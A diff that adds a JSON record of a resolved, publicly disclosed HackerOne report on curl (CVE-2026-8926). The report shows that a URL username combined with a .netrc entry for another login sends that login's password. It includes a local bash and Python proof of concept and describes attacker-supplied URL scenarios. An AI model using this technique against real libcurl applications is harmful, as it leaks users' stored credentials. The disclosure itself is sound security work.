@@ -1,0 +1,113 @@
+{
+  "id": 3735184,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM1MTg0",
+  "url": "https://hackerone.com/reports/3735184",
+  "title": "CVE-2026-8926: password leak with netrc and user in URL",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-14T11:38:36.412Z",
+  "submitted_at": "2026-05-14T11:38:59.817Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-8926"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:23:22.318Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:17:22.964Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey all,\nBefore the following report, I just want to point to a comment from our scanner, where it seems it was already picked up but it was dismissed and the PR was closed later by another commit - https://github.com/curl/curl/pull/20932#issuecomment-4072903895\n\nNonetheless, it appears this issue exists for a while, actually since `e9b9bbac22c26cf67316fa8e6c6b9e831af31949` (2024-11-15)\n\n## Summary:\ncurl/libcurl can combine a username supplied in the URL with a password from a .netrc entry whose explicit login does not match that username.\n\nFor example, if .netrc contains credentials for alice, and the requested URL contains username bob, curl sends an HTTP Basic Authorization header for bob:alice_password.\n\nThis contradicts the documented behavior that, when a username is provided in the URL, curl/libcurl looks for the password for that specific user, or falls back to a generic machine entry without a login.\n\n## Steps To Reproduce:\nGiven this .netrc:\n\n`machine 127.0.0.1 login alice password secret`\n\nand this request:\n\n`curl --netrc-optional http://bob@127.0.0.1:18080/`\n\ncurl sends:\n\n`Authorization: Basic Ym9iOnNlY3JldA==`\n\nwhich decodes to:\n\n`bob:secret`\n\nThe password secret belongs to login alice, but it is sent with URL username bob.\n\nPoC\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\ntmp=\"$(mktemp -d)\"\nport=18080\n\nmkdir -p \"$tmp/home\"\n\ncat >\"$tmp/home/.netrc\" <<'EOF'\nmachine 127.0.0.1 login alice password secret\nEOF\nchmod 0600 \"$tmp/home/.netrc\"\n\ncat >\"$tmp/server.py\" <<'PY'\nimport base64\nimport http.server\nimport socketserver\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        auth = self.headers.get(\"Authorization\", \"\")\n        print(\"Authorization:\", auth, flush=True)\n        if auth.startswith(\"Basic \"):\n            decoded = base64.b64decode(auth.split(\" \", 1)[1]).decode()\n            print(\"Decoded:\", decoded, flush=True)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"ok\\n\")\n\n    def log_message(self, fmt, *args):\n        pass\n\nwith socketserver.TCPServer((\"127.0.0.1\", 18080), Handler) as httpd:\n    httpd.handle_request()\nPY\n\npython3 \"$tmp/server.py\" &\nserver_pid=$!\nsleep 0.3\n\nHOME=\"$tmp/home\" curl \\\n    --silent \\\n    --show-error \\\n    --netrc-optional \\\n    \"http://bob@127.0.0.1:$port/\" \\\n    >/dev/null\n\nwait \"$server_pid\"\n```\n\nExpected Result\n\ncurl should not use alice’s password for URL username bob.\n\nExpected decoded credential should either be:\n\n`bob:`\n\nor no Authorization header, depending on the selected .netrc mode and fallback behavior.\n\nActual Result\n\n`Authorization: Basic Ym9iOnNlY3JldA==`\n`Decoded: bob:secret`\n\n## Impact\n\n## Summary:\n\nAn attacker who can influence a URL passed to curl/libcurl while .netrc is enabled can cause a saved password for one account on a host to be sent under a different username for that same host.\n\nImpact examples:\n\n  - Password submission to the wrong account context on the same host.\n  - libcurl-based applications that fetch attacker-controlled URLs with CURLOPT_NETRC enabled may leak stored .netrc passwords without the application intending to authenticate as that user.\n\nThis is not a cross-host credential leak, but it violates the username-specific .netrc selection semantics and can expose credentials in realistic URL-injection or attacker-supplied URL\nworkflows.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
